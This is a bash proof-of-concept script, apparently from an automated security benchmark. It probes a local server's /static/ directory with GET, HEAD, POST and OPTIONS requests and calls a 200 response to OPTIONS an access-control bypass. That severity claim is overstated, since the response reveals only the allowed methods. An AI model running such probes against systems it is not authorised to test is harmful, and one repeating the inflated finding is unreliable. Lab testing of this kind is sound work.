#!/bin/bash
# POC: Demonstrates HTTP OPTIONS method bypassing access control on /static/ directory while GET/HEAD/POST are blocked with 403 Forbidden
# Target: ./repo
# Created: 2025-11-07T21:37:10.870Z
# Session: benchmark-XBEN-072-24-mhpdc97t

# HTTP Method-Based Access Control Bypass - OPTIONS Method POC
# This script demonstrates how the OPTIONS HTTP method can bypass
# access control restrictions on the /static/ directory

TARGET_URL="http://localhost:8080"
STATIC_DIR="/static/"

echo "==================================================================="
echo "HTTP Method-Based Access Control Bypass - OPTIONS Method POC"
echo "==================================================================="
echo ""
echo "Target: $TARGET_URL$STATIC_DIR"
echo ""

# Test 1: GET request (should be blocked)
echo "[*] Test 1: GET request to /static/ directory"
echo "Command: curl -I $TARGET_URL$STATIC_DIR"
echo ""
GET_RESPONSE=$(curl -s -w "\n%{http_code}" -I "$TARGET_URL$STATIC_DIR")
GET_STATUS=$(echo "$GET_RESPONSE" | tail -n 1)
GET_HEADERS=$(echo "$GET_RESPONSE" | head -n -1)

echo "Response Status: HTTP $GET_STATUS"
echo "Response Headers:"
echo "$GET_HEADERS"
echo ""

# Test 2: OPTIONS request (should bypass and return 200)
echo "[*] Test 2: OPTIONS request to /static/ directory"
echo "Command: curl -X OPTIONS -v $TARGET_URL$STATIC_DIR"
echo ""
OPTIONS_RESPONSE=$(curl -s -w "\n%{http_code}" -X OPTIONS -v "$TARGET_URL$STATIC_DIR" 2>&1)
OPTIONS_STATUS=$(echo "$OPTIONS_RESPONSE" | tail -n 1)
OPTIONS_FULL=$(echo "$OPTIONS_RESPONSE" | head -n -1)

echo "Response Status: HTTP $OPTIONS_STATUS"
echo "Full Response:"
echo "$OPTIONS_FULL"
echo ""

# Test 3: HEAD request (should be blocked like GET)
echo "[*] Test 3: HEAD request to /static/ directory"
echo "Command: curl -I -X HEAD $TARGET_URL$STATIC_DIR"
echo ""
HEAD_RESPONSE=$(curl -s -w "\n%{http_code}" -I -X HEAD "$TARGET_URL$STATIC_DIR")
HEAD_STATUS=$(echo "$HEAD_RESPONSE" | tail -n 1)
HEAD_HEADERS=$(echo "$HEAD_RESPONSE" | head -n -1)

echo "Response Status: HTTP $HEAD_STATUS"
echo "Response Headers:"
echo "$HEAD_HEADERS"
echo ""

# Test 4: POST request (different error - 404 vs 403)
echo "[*] Test 4: POST request to /static/ directory"
echo "Command: curl -X POST $TARGET_URL$STATIC_DIR"
echo ""
POST_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL$STATIC_DIR")
POST_STATUS=$(echo "$POST_RESPONSE" | tail -n 1)
POST_BODY=$(echo "$POST_RESPONSE" | head -n -1)

echo "Response Status: HTTP $POST_STATUS"
echo "Response Body:"
echo "$POST_BODY"
echo ""

# Analysis
echo "==================================================================="
echo "VULNERABILITY ANALYSIS"
echo "==================================================================="
echo ""

if [ "$GET_STATUS" = "403" ]; then
    echo "[✓] GET request blocked with HTTP 403 Forbidden"
else
    echo "[✗] GET request NOT blocked (Status: $GET_STATUS)"
fi

if [ "$HEAD_STATUS" = "403" ]; then
    echo "[✓] HEAD request blocked with HTTP 403 Forbidden"
else
    echo "[✗] HEAD request NOT blocked (Status: $HEAD_STATUS)"
fi

if [ "$POST_STATUS" = "404" ] || [ "$POST_STATUS" = "403" ]; then
    echo "[✓] POST request blocked/not found (Status: $POST_STATUS)"
else
    echo "[✗] POST request NOT blocked (Status: $POST_STATUS)"
fi

if [ "$OPTIONS_STATUS" = "200" ]; then
    echo "[✓] VULNERABILITY: OPTIONS request BYPASSES access control (HTTP 200 OK)"
    echo "[!] This reveals allowed methods: $(echo "$OPTIONS_FULL" | grep -i "Allow:" | head -1)"
    echo ""
    echo "SEVERITY: Access control inconsistency detected!"
    echo "The OPTIONS method is not protected while other methods are blocked."
    exit 0
else
    echo "[✗] OPTIONS request also blocked (Status: $OPTIONS_STATUS)"
    exit 1
fi